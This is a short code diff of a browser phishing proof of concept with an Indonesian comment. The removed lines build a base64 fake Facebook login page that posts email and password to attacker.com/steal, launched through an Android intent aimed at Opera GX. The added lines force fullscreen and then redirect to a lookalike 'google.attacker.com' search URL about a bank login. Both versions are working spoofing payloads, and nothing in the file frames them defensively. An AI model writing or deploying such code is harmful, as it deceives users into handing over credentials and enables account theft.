@@ -1,20 +1,6 @@
+<!-- Trigger fullscreen, lalu redirect ke search engine spoof -->
 <script>
-const base64Content = btoa(`
-<html>
-<head><title>Facebook Login</title></head>
-<body>
-    <h1>Facebook</h1>
-    <form action="https://attacker.com/steal">
-        <input name="email" placeholder="Email">
-        <input name="pass" placeholder="Password">
-        <button>Log In</button>
-    </form>
-</body>
-</html>
-`);
-
-const base64Intent = 
-"intent://vtp.operagx.gg/?url=" +
-"data:text/html;base64," + base64Content +
-"#Intent;scheme=https;category=android.intent.category.BROWSABLE;package=com.opera.gx;end";
+document.documentElement.requestFullscreen().then(() => {
+    window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+});
 </script>
